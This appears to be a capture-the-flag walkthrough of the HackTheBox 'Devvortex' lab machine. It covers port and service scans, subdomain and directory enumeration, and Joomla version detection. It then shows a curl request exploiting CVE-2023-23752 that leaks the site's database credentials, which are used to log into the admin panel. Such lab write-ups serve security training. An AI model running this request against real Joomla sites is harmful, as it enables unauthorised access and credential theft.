# **Machine Info**

| OS        | Linux    |
| --------- | -------- |
| **Level** | **Easy** |


# **Walkthrough**
**Enumeration**
1. Scanning the open ports first revels two ports 22 and 80 running ssh and http.
```
	$sudo nmap -p- --min-rate 10000 -oA portScan 10.10.11.242
	Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-13 18:14 +0545
	Nmap scan report for 10.10.11.242 (10.10.11.242)
	Host is up (0.33s latency).
	Not shown: 65533 closed tcp ports (reset)
	PORT   STATE SERVICE
	22/tcp open  ssh
	80/tcp open  http
```

2. Further scanning the open port for the service version along with default set script.
```
	$sudo nmap -sC -sV -p22,80 --min-rate 10000 -oA serviceScan 10.10.11.242
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-13 18:15 +0545
Nmap scan report for 10.10.11.242 (10.10.11.242)
Host is up (0.33s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://devvortex.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.81 seconds

```

3. Adding the domain name in our `/etc/hosts` file.
	- ![](Assets/Pasted%20image%2020250313183443.png)

4. This is the website running in the 80 port.
	![](Assets/Pasted%20image%2020250320033427.png)

5. During subdomain enumeration, I discovered `dev.devvortex.htb`.
	![](Assets/Pasted%20image%2020250320033021.png)
	- I then updated the `/etc/hosts` file to include this new subdomain. Upon visiting `dev.devvortex.htb`, I noticed that the website appeared different from the main domain.

6. After the directory enumeration on the new sub-domain, i found a few of status 200 which indicate success and lots of status 403 which mean access to the following resources were forbidden.
	- ![](Assets/Pasted%20image%2020250320040449.png)
	- Here are all the directory name of status code 200 with size. Among it, i found `/robots.txt` interesting as it might contain other hidden directories. Robot.txt is the page containing instruction for bot, like web crawler, which web page to access and not to access.
		```
		/index.php            (Status: 200) [Size: 23221]
		/LICENSE.txt          (Status: 200) [Size: 18092]
		/robots.txt           (Status: 200) [Size: 764]
		/.                    (Status: 200) [Size: 23221]
		/configuration.php    (Status: 200) [Size: 0]
		/README.txt           (Status: 200) [Size: 4942]
		/htaccess.txt         (Status: 200) [Size: 6858]
		```

7. I then visited the `robot.txt` directory and know that it is running Zoomla CMS (Content Management System). Then i ran zoomscan, a zoomla vulnerability scanner, on the site, which detected the version name `4.2.6`. A google search reveal that, the version is vulnerable to improper access check leading to unauthorised access (CVE-2023-23752). 
	```
	
	[+] FireWall Detector
	[++] Firewall not detected
	
	[+] Detecting Joomla Version
	[++] Joomla 4.2.6
	
	[+] Core Joomla Vulnerability
	[++] Target Joomla core is not vulnerable
	
	[+] Checking apache info/status files
	[++] Readable info/status files are not found
	
	[+] admin finder
	[++] Admin page : http://dev.devvortex.htb/administrator/
	
	[+] Checking robots.txt existing
	[++] robots.txt is found
	path : http://dev.devvortex.htb/robots.txt 
	
	Interesting path found from robots.txt
	http://dev.devvortex.htb/joomla/administrator/
	http://dev.devvortex.htb/administrator/
	http://dev.devvortex.htb/api/
	http://dev.devvortex.htb/bin/
	http://dev.devvortex.htb/cache/
	http://dev.devvortex.htb/cli/
	http://dev.devvortex.htb/components/
	http://dev.devvortex.htb/includes/
	http://dev.devvortex.htb/installation/
	http://dev.devvortex.htb/language/
	http://dev.devvortex.htb/layouts/
	http://dev.devvortex.htb/libraries/
	http://dev.devvortex.htb/logs/
	http://dev.devvortex.htb/modules/
	http://dev.devvortex.htb/plugins/
	http://dev.devvortex.htb/tmp/
	
	
	[+] Finding common backup files name
	[++] Backup files are not found
	
	[+] Finding common log files name
	[++] error log is not found
	
	[+] Checking sensitive config.php.x file
	[++] Readable config files are not found
	```

8. Exploiting the vulnerability, I got the user credential.
```
	curl  http://dev.devvortex.htb/api/index.php/v1/config/application?public=true
```
`{"type":"application","id":"224","attributes":{"user":"lewis","id":224}},{"type":"application","id":"224","attributes":{"password":"P4ntherg0t1n5r3c0n##","id":224}},{"type":"application","id":"224","attributes":{"db":"joomla","id":224}},{"type":"application","id":"224","attributes":{"dbprefix":"sd4fg_","id":224}},`

- Then i logged in to `/administrator/index.php` with the credential and got access to the administrator dashboard.
- ![](Assets/Pasted%20image%2020250320053843.png)
- ![](Assets/Pasted%20image%2020250320053911.png)









https://iammr0ot.github.io/posts/devvortex/


https://medium.com/@aniketdas07770/hackthebox-devvortex-writeup-b6fa1f007dff